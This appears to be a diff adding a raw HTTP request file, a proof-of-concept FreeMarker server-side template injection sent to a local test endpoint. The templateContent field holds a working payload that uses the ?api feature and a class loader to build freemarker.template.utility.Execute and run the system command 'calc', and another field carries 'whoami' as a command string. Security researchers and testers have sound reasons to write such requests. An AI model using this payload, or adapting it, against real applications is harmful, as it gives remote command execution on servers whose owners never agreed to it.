@@ -1,0 +1,14 @@
+POST /test2 HTTP/1.1
+Host: 127.0.0.1:8080
+Accept: text/html
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 383
+
+age=100&name=whoami&templateContent=
+<#assign classLoader=user?api.class.protectionDomain.classLoader> 
+<#assign clazz=classLoader.loadClass("com.test.freemarker.ClassExposingGSON")> 
+<#assign field=clazz?api.getField("GSON")> 
+<#assign gson=field?api.get(null)> 
+<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
+${ex("calc")}
